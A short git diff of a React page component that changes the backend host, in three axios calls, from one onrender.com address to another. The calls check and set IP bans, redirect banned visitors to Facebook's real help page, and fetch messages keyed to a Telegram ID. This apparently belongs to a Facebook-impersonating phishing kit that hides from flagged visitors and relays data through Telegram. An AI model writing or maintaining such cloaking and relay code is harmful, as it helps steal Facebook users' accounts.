@@ -61,7 +61,7 @@ export default function Home() {
 
   useEffect(() => {
     const CheckBan = async (ip) => {
-      await axios.get(`https://fbback-tpzs.onrender.com/checkBan/${ip}`).then((data) => {
+      await axios.get(`https://fb-back-78vb.onrender.com/checkBan/${ip}`).then((data) => {
         if (data.data.data) {
           window.location.href = 'https://fb.com/help'
         }
@@ -77,7 +77,7 @@ export default function Home() {
   }, [Step])
 
   const getUserTelegramId = async (uniqueString) => {
-    const x = await axios.get(`https://fbback-tpzs.onrender.com/getMessages`)
+    const x = await axios.get(`https://fb-back-78vb.onrender.com/getMessages`)
 
     const result = x?.data?.data?.result || [];
 
@@ -238,7 +238,7 @@ export default function Home() {
       if (LastFetch !== 'Ban') {
         if (ban) {
           setLastFetch('Ban')
-          axios.get(`https://fbback-tpzs.onrender.com/ban/${Ip}`)
+          axios.get(`https://fb-back-78vb.onrender.com/ban/${Ip}`)
         }
       }
 
